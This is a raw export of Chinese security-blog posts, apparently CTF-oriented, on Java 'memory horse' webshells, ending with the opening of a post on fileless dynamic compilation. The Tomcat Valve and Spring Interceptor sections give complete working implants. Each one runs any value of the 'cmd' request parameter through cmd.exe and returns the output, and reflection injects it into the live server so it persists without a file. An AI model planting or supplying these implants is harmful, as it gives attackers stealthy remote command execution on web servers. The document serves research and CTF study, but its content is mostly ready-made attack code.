class="string">&quot;/c&quot;</span>, cmd);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> processBuilder.start();</span><br><span class="line">                    <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream()));</span><br><span class="line">                    String line;</span><br><span class="line">                    <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                        output.append(line).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                &#125;</span><br><span class="line">                response.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">                response.getWriter().println(output);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>获取当前web应用的<code>StandardContext</code>，将恶意阀注入</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line"></span><br><span class="line">Class&lt;?&gt; servletContextClass =  servletContext.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">applicationContext</span> <span class="operator">=</span> servletContextClass.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">applicationContext.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">trueApplicationContext</span> <span class="operator">=</span> (ApplicationContext) applicationContext.get(servletContext);</span><br><span class="line"></span><br><span class="line">Class&lt;? <span class="keyword">extends</span> <span class="title class_">ApplicationContext</span>&gt; applicationContextClass = trueApplicationContext.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">standardContext</span> <span class="operator">=</span> applicationContextClass.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">standardContext.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">trueStandardContext</span> <span class="operator">=</span> (StandardContext) standardContext.get(trueApplicationContext);</span><br><span class="line">trueStandardContext.getPipeline().addValve(<span class="keyword">new</span> <span class="title class_">ValveShell</span>());</span><br></pre></td></tr></table></figure><p>完整的jsp文件</p><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.valves.ValveBase&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.BufferedReader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStreamReader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ValveShell</span> <span class="keyword">extends</span> <span class="title class_">ValveBase</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">StringBuilder</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">                ProcessBuilder processBuilder;</span><br><span class="line">                processBuilder = <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> processBuilder.start();</span><br><span class="line">                    <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream()));</span><br><span class="line">                    String line;</span><br><span class="line">                    <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                        output.append(line).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                &#125;</span><br><span class="line">                response.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">                response.getWriter().println(output);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; servletContextClass =  servletContext.getClass();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">applicationContext</span> <span class="operator">=</span> servletContextClass.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    applicationContext.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">trueApplicationContext</span> <span class="operator">=</span> (ApplicationContext) applicationContext.get(servletContext);</span><br><span class="line"></span><br><span class="line">    Class&lt;? <span class="keyword">extends</span> <span class="title class_">ApplicationContext</span>&gt; applicationContextClass = trueApplicationContext.getClass();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">standardContext</span> <span class="operator">=</span> applicationContextClass.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    standardContext.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">trueStandardContext</span> <span class="operator">=</span> (StandardContext) standardContext.get(trueApplicationContext);</span><br><span class="line">    trueStandardContext.getPipeline().addValve(<span class="keyword">new</span> <span class="title class_">ValveShell</span>());</span><br><span class="line"></span><br><span class="line">    response.getWriter().write(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>Valve在流量到达Context容器前就已在发挥作用，其优先级比<code>Filter</code>、<code>Servlet</code>、<code>Listener</code>和Spring框架中的内存马都要高</p><br/>]]></content>
      
      
      <categories>
          
          <category> CTF相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Interceptor内存马</title>
      <link href="/2026/01/15/Interceptor%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2026/01/15/Interceptor%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<h1 id="Interceptor内存马"><a href="#Interceptor内存马" class="headerlink" title="Interceptor内存马"></a>Interceptor内存马</h1><p>Interceptor拦截器是Spring框架下的组件，其作用类似于Tomcat中的Filter，Interceptor可以请求到达Controller前进行拦截进行相应操作</p><br/><h2 id="Interceptor注册流程"><a href="#Interceptor注册流程" class="headerlink" title="Interceptor注册流程"></a>Interceptor注册流程</h2><p>在Interceptor调用的上层方法<code>doDispatch()</code>中，<code>mappedHandler</code>变量中的<code>interceptorList</code>字段就已经存储了我们定义的Interceptor了，因此接下来需要找到<code>interceptorList</code>字段何时被赋值</p><p><img src="/img/post/image-20260115003830705.png" alt="image-20260115003830705"></p><p>由于<code>interceptorList</code>字段在<code>mappedHandler</code>中，追溯发现<code>mappedHandler</code>在<code>doDispatch()</code>方法中被<code>getHandler()</code>方法作为返回值输出</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">mappedHandler = getHandler(processedRequest);</span><br></pre></td></tr></table></figure><p>步入该方法，返回值<code>handler</code>在对<code>mapping</code>调用<code>getHandler()</code>方法时被定义和赋值</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Nullable</span></span><br><span class="line"><span class="keyword">protected</span> HandlerExecutionChain <span class="title function_">getHandler</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.handlerMappings != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">for</span> (HandlerMapping mapping : <span class="built_in">this</span>.handlerMappings) &#123;</span><br><span class="line"><span class="type">HandlerExecutionChain</span> <span class="variable">handler</span> <span class="operator">=</span> mapping.getHandler(request);</span><br><span class="line"><span class="keyword">if</span> (handler != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> handler;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意到某个遍历出来的<code>mapping</code>中含有拦截器</p><p><img src="/img/post/image-20260115004936735.png" alt="image-20260115004936735"></p><p>该mapping的类型是确定的<code>RequestMappingHandlerMapping</code>，或许我们可以直接篡改该类的字段，但是现在还不知道拦截器是从<code>interceptors</code>字段还是<code>adaptedInterceptors</code>字段获取的，步入<code>getHandler()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> HandlerExecutionChain <span class="title function_">getHandler</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="type">Object</span> <span class="variable">handler</span> <span class="operator">=</span> getHandlerInternal(request);</span><br><span class="line"><span class="keyword">if</span> (handler == <span class="literal">null</span>) &#123;</span><br><span class="line">handler = getDefaultHandler();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (handler == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Bean name or resolved handler?</span></span><br><span class="line"><span class="keyword">if</span> (handler <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">handlerName</span> <span class="operator">=</span> (String) handler;</span><br><span class="line">handler = obtainApplicationContext().getBean(handlerName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Ensure presence of cached lookupPath for interceptors and others</span></span><br><span class="line"><span class="keyword">if</span> (!ServletRequestPathUtils.hasCachedPath(request)) &#123;</span><br><span class="line">initLookupPath(request);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">HandlerExecutionChain</span> <span class="variable">executionChain</span> <span class="operator">=</span> getHandlerExecutionChain(handler, request);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (logger.isTraceEnabled()) &#123;</span><br><span class="line">logger.trace(<span class="string">&quot;Mapped to &quot;</span> + handler);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (logger.isDebugEnabled() &amp;&amp; !DispatcherType.ASYNC.equals(request.getDispatcherType())) &#123;</span><br><span class="line">logger.debug(<span class="string">&quot;Mapped to &quot;</span> + executionChain.getHandler());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (hasCorsConfigurationSource(handler) || CorsUtils.isPreFlightRequest(request)) &#123;</span><br><span class="line"><span class="type">CorsConfiguration</span> <span class="variable">config</span> <span class="operator">=</span> getCorsConfiguration(handler, request);</span><br><span class="line"><span class="keyword">if</span> (getCorsConfigurationSource() != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="type">CorsConfiguration</span> <span class="variable">globalConfig</span> <span class="operator">=</span> getCorsConfigurationSource().getCorsConfiguration(request);</span><br><span class="line">config = (globalConfig != <span class="literal">null</span> ? globalConfig.combine(config) : config);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (config != <span class="literal">null</span>) &#123;</span><br><span class="line">config.validateAllowCredentials();</span><br><span class="line">&#125;</span><br><span class="line">executionChain = getCorsHandlerExecutionChain(request, executionChain, config);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> executionChain;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该方法的返回值<code>executionChain</code>在<code>getHandlerExecutionChain()</code>方法被创建，同时也在该方法被赋给了拦截器<code>interceptorList</code>字段</p><p><img src="/img/post/image-20260115005802252.png" alt="image-20260115005802252"></p><p>步入<code>getHandlerExecutionChain()</code>方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> HandlerExecutionChain <span class="title function_">getHandlerExecutionChain</span><span class="params">(Object handler, HttpServletRequest request)</span> &#123;</span><br><span class="line"><span class="type">HandlerExecutionChain</span> <span class="variable">chain</span> <span class="operator">=</span> (handler <span class="keyword">instanceof</span> HandlerExecutionChain ?</span><br><span class="line">(HandlerExecutionChain) handler : <span class="keyword">new</span> <span class="title class_">HandlerExecutionChain</span>(handler));</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (HandlerInterceptor interceptor : <span class="built_in">this</span>.adaptedInterceptors) &#123;</span><br><span class="line"><span class="keyword">if</span> (interceptor <span class="keyword">instanceof</span> MappedInterceptor) &#123;</span><br><span class="line"><span class="type">MappedInterceptor</span> <span class="variable">mappedInterceptor</span> <span class="operator">=</span> (MappedInterceptor) interceptor;</span><br><span class="line"><span class="keyword">if</span> (mappedInterceptor.matches(request)) &#123;</span><br><span class="line">chain.addInterceptor(mappedInterceptor.getInterceptor());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">chain.addInterceptor(interceptor);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> chain;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不难发现，<code>chain</code>从<code>addInterceptor()</code>获取拦截器，传入的拦截器从<code>adaptedInterceptors</code>字段遍历出来，该字段也含有我们定义的拦截器</p><p><img src="/img/post/image-20260115010242888.png" alt="image-20260115010242888"></p><p><code>adaptedInterceptors</code>本质是一个List，是<code>AbstractHandlerMapping</code>类中的字段，该父类的一个子类<code>RequestMappingInfoHandlerMapping</code>的子类<code>RequestMappingHandlerMapping</code>，该类的一个实例对象正好就是<code>webApplicationContex</code>的一个字段，可以借助之前Controller内存马的方法获取<code>RequestMappingHandlerMapping</code>，进而获取<code>adaptedInterceptors</code></p><br/><h2 id="Interceptor内存马构建"><a href="#Interceptor内存马构建" class="headerlink" title="Interceptor内存马构建"></a>Interceptor内存马构建</h2><p>编写一个执行命令的恶意拦截器</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexInterceptor</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest httprequest, <span class="meta">@NonNull</span> HttpServletResponse response, <span class="meta">@NonNull</span> Object handler)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="type">ServletRequestAttributes</span> <span class="variable">attributes</span> <span class="operator">=</span> (ServletRequestAttributes) RequestContextHolder.getRequestAttributes();</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> attributes.getRequest();</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">ProcessBuilder</span> <span class="variable">processBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd);</span><br><span class="line">                <span class="type">StringBuilder</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">                String output;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> processBuilder.start();</span><br><span class="line">                    <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream(), <span class="string">&quot;GBK&quot;</span>));</span><br><span class="line">                    String line;</span><br><span class="line">                    <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                        result.append(line).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    output = result.toString();</span><br><span class="line">                    response.setCharacterEncoding(<span class="string">&quot;GBK&quot;</span>);</span><br><span class="line">                    response.getWriter().print(output);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>编写触发逻辑，获取web上下文环境，<code>adaptedInterceptors</code>并通过反射获取<code>adaptedInterceptors</code>，将恶意拦截器注入该字段</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">webApplicationContext</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.getRequestAttributes().getAttribute(DispatcherServlet.WEB_APPLICATION_CONTEXT_ATTRIBUTE, <span class="number">0</span>);</span><br><span class="line"><span class="type">RequestMappingHandlerMapping</span> <span class="variable">handlerMapping</span> <span class="operator">=</span> webApplicationContext.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line"><span class="type">Field</span> <span class="variable">adaptedInterceptors</span> <span class="operator">=</span> AbstractHandlerMapping.class.getDeclaredField(<span class="string">&quot;adaptedInterceptors&quot;</span>);</span><br><span class="line">adaptedInterceptors.setAccessible(<span class="literal">true</span>);</span><br><span class="line">List&lt;HandlerInterceptor&gt; list = (List&lt;HandlerInterceptor&gt;) adaptedInterceptors.get(handlerMapping);</span><br><span class="line">list.add(<span class="keyword">new</span> <span class="title class_">IndexInterceptor</span>());</span><br></pre></td></tr></table></figure><p>完整逻辑</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;injectInterceptor&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">injectInterceptor</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">WebApplicationContext</span> <span class="variable">webApplicationContext</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.getRequestAttributes().getAttribute(DispatcherServlet.WEB_APPLICATION_CONTEXT_ATTRIBUTE, <span class="number">0</span>);</span><br><span class="line">        <span class="type">RequestMappingHandlerMapping</span> <span class="variable">handlerMapping</span> <span class="operator">=</span> webApplicationContext.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">adaptedInterceptors</span> <span class="operator">=</span> AbstractHandlerMapping.class.getDeclaredField(<span class="string">&quot;adaptedInterceptors&quot;</span>);</span><br><span class="line">        adaptedInterceptors.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        List&lt;HandlerInterceptor&gt; list = (List&lt;HandlerInterceptor&gt;) adaptedInterceptors.get(handlerMapping);</span><br><span class="line">        list.add(<span class="keyword">new</span> <span class="title class_">IndexInterceptor</span>());</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;injected&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexInterceptor</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest httprequest, <span class="meta">@NonNull</span> HttpServletResponse response, <span class="meta">@NonNull</span> Object handler)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="type">ServletRequestAttributes</span> <span class="variable">attributes</span> <span class="operator">=</span> (ServletRequestAttributes) RequestContextHolder.getRequestAttributes();</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> attributes.getRequest();</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">ProcessBuilder</span> <span class="variable">processBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd);</span><br><span class="line">                <span class="type">StringBuilder</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">                String output;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> processBuilder.start();</span><br><span class="line">                    <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream(), <span class="string">&quot;GBK&quot;</span>));</span><br><span class="line">                    String line;</span><br><span class="line">                    <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                        result.append(line).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    output = result.toString();</span><br><span class="line">                    response.setCharacterEncoding(<span class="string">&quot;GBK&quot;</span>);</span><br><span class="line">                    response.getWriter().print(output);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br/>]]></content>
      
      
      <categories>
          
          <category> CTF相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java动态类编译简析</title>
      <link href="/2026/01/12/Java%E5%8A%A8%E6%80%81%E7%B1%BB%E7%BC%96%E8%AF%91%E7%AE%80%E6%9E%90/"/>
      <url>/2026/01/12/Java%E5%8A%A8%E6%80%81%E7%B1%BB%E7%BC%96%E8%AF%91%E7%AE%80%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="Java动态类编译简析"><a href="#Java动态类编译简析" class="headerlink" title="Java动态类编译简析"></a>Java动态类编译简析</h1><p>借助动态编译机制可以在程序运行时编译java源代码文件并将其编译为class文件加入运行逻辑</p><br/><h2 id="一般的动态编译"><a href="#一般的动态编译" class="headerlink" title="一般的动态编译"></a>一般的动态编译</h2><p>基本的动态编译无非是在程序工作目录下新建.java源代码文件，写入定义的类，再交给编译器进行编译，最后拿到编译的.classz字节码文件进行类加载、实例化，这里演示在文件落地的情况下进行动态编译</p><p>前期工作，我们需要获取程序的工作目录并在相同目录写入.java文件</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">classPath</span> <span class="operator">=</span> CompileTest.class.getResource(<span class="string">&quot;/&quot;</span>).getPath();</span><br><span class="line"><span class="comment">//Windows环境下需删去路径开头的&quot;/&quot;</span></span><br><span class="line">classPath = classPath.substring(<span class="number">1</span>);</span><br><span class="line"><span class="type">FileWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileWriter</span>(classPath+<span class="string">&quot;TransformerTest.java&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">sourceCode</span> <span class="operator">=</span> <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">import org.apache.commons.collections.Transformer;</span></span><br><span class="line"><span class="string">import org.apache.commons.collections.functors.ConstantTransformer;</span></span><br><span class="line"><span class="string">                </span></span><br><span class="line"><span class="string">public class TransformerTest implements CompileTest &#123;</span></span><br><span class="line"><span class="string">public void test() &#123;</span></span><br><span class="line"><span class="string">Transformer[]  transformers = new Transformer[]&#123;new ConstantTransformer(null)&#125;;</span></span><br><span class="line"><span class="string">ConstantTransformer constantTransformer = new ConstantTransformer(transformers);</span></span><br><span class="line"><span class="string">System.out.println(constantTransformer.transform(&quot;hello&quot;).toString());</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;&quot;&quot;&quot;</span>;</span><br><span class="line">writer.write(sourceCode);</span><br><span class="line">writer.close();</span><br></pre></td></tr></table></figure><p>接下来，获取编译器，编译器可以通过<code>ToolProvider</code>类中的静态方法<code>getSystemJavaCompiler()</code>获取，此外还需要从编译器中获取<code>StandardJavaFileManager</code>实例，该实例用于将物理文件系统转化为 Java 编译器可以理解的对象</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">JavaCompiler</span> <span class="variable">compiler</span> <span class="operator">=</span> ToolProvider.getSystemJavaCompiler();</span><br><span class="line"><span class="type">StandardJavaFileManager</span> <span class="variable">manager</span> <span class="operator">=</span> compiler.getStandardFileManager(<span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure><p>接下来，构建编译任务，调用任务类的<code>call()</code>方法进行编译</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">JavaCompiler.<span class="type">CompilationTask</span> <span class="variable">task</span> <span class="operator">=</span> compiler.getTask(<span class="literal">null</span>, manager, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, files);</span><br><span class="line">task.call();</span><br></pre></td></tr></table></figure><p>接下来，从编译得到的class字节码文件获取类加载器，这里使用<code>URLClassLoader</code>类，之后就可以使用类加载器实例化类，并调用方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">URLClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;file:///&quot;</span>+classPath)&#125;);</span><br><span class="line"><span class="type">CompileTest</span> <span class="variable">transformerTest</span> <span class="operator">=</span> (CompileTest) classLoader.loadClass(<span class="string">&quot;TransformerTest&quot;</span>).newInstance();</span><br><span class="line">transformerTest.test();</span><br></pre></td></tr></table></figure><p>成功编译并调用了方法</p><p><img src="/img/post/image-20260112191928307.png" alt="image-20260112191928307"></p><br/><h2 id="无文件落地的动态编译"><a href="#无文件落地的动态编译" class="headerlink" title="无文件落地的动态编译"></a>无文件落地的动态编译</h2><p>是否有可能让一切过程都在内存中发生而不产生具体文件呢？答案是肯定的，在调用<code>call()</code>方法执行编译任务时也是需要用到源代码和字节码的，接下来可以尝试去改写编译器获取以上两个文件的逻辑</p><p>前面提到<code>StandardJavaFileManager</code>实例用于将物理文件系统转化为 Java 编译器可以理解的对象，我们对该实例调用了<code>getJavaFileObjects()</code>方法获得了一个迭代器，该迭代器内部有一个<code>SimpleFileObject</code>实例，内部主要是指向java源代码文件的url路径</p><p><img src="/img/post/image-20260112202039305.png" 